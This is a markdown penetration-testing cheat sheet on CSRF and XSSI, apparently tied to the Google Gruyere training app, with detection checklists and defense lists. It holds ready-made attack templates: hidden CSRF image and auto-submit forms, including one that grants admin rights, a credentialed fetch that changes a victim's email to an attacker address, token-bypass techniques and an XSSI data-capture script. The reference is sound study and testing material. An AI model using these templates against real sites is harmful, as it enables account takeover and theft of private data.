# CSRF + XSSI

## CSRF (Cross-Site Request Forgery)

**Core principle**: Browsers send cookies automatically with every request regardless of origin.
The server cannot distinguish a legitimate user action from an attacker-triggered one.

### Detection

```
# Check for missing CSRF token on state-changing requests:
POST /deleteAccount
POST /changeEmail
POST /transferFunds
GET  /deletesnippet?index=0   ← GET should never change state

# Check if token is validated server-side (not just present in form)
# Common bypass: remove token entirely — if request succeeds, validation is missing
```

### Attack Templates

```html
<!-- Basic GET-based CSRF (image tag) -->
<img src="https://TARGET.com/deletesnippet?index=0" style="display:none">

<!-- POST-based CSRF (auto-submit form) -->
<form action="https://TARGET.com/saveprofile" method="POST" id="csrf">
  <input name="is_admin" value="True">
  <input name="uid" value="victim_username">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- JSON POST (if CORS misconfigured) -->
<script>
fetch('https://TARGET.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  body: JSON.stringify({email: 'attacker@evil.com'}),
  headers: {'Content-Type': 'application/json'}
});
</script>
```

### Elevation of Privilege via Client-State Manipulation

Google Gruyere pattern — server only checks client-side UI, not backend:

```
# URL manipulation to set admin flag:
POST /saveprofile?action=update&is_admin=True&uid=victim_username

# Cookie format attack:
# Cookie format: hash|username|admin|author
# Register with username: foo|admin|author
# → cookie becomes: hash|foo|admin|author||author  (grants admin)
```

### Bypass Techniques

```
1. Remove token entirely → request succeeds if validation is missing
2. Use any valid token from your own session (if token not tied to session)
3. Predict token (if based on timestamp / weak PRNG)
4. CSRF via CORS misconfiguration (see misc.md)
5. Method override: POST with _method=DELETE
6. Content-Type bypass: text/plain instead of application/json (no preflight)
```

### Defenses (what to look for as MISSING)

| Defense | Bypass if absent |
|---|---|
| CSRF token in form | Forged form submits |
| SameSite=Strict cookie | Cross-origin requests include cookie |
| Origin/Referer check | Forged requests from attacker origin |
| Re-auth for sensitive actions | Any CSRF → account takeover |

---

## XSSI (Cross-Site Script Inclusion)

Browsers allow `<script src="cross-origin">` to execute in the including page's context.
If a JSON endpoint returns sensitive data and is accessible via script tag → data leak.

### Attack

```html
<!-- Attacker page overrides Array/Object constructors to capture data -->
<script>
function _feed(s) {
  alert("Private snippet: " + s['private_snippet']);
}
</script>
<script src="https://TARGET.com/feed.gtl"></script>
<!-- If feed.gtl calls _feed({...}) → attacker captures data -->
```

### Detection

```
# Does the JSON endpoint:
1. Return sensitive data (session info, private fields)?
2. Accept GET requests?
3. Execute a JS function call (JSONP-style)?
4. Lack XSRF token requirement?
→ Likely XSSI vulnerable
```

### Defense (what to check for)

```
1. Require XSRF token on JSON endpoints with sensitive data
2. JSON endpoints → POST only (blocks <script src=>)
3. Prepend: )]}' or ])}while(1); to JSON response body
4. Never use JSONP for private data
5. Content-Type: application/json (not application/javascript)
```

---

## Writeup References

- CSRF account takeover: https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa
- XSSI / JSONP data leak: https://medium.com/bugbountywriteup/effortlessly-finding-cross-site-script-inclusion-xssi-jsonp-for-bug-bounty-38ae0b9e5c8a
